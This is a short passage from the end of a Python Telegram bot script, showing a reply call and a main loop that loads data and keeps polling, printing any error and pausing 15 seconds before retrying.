    bot.reply_to(message, response)

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
            time.sleep(15)
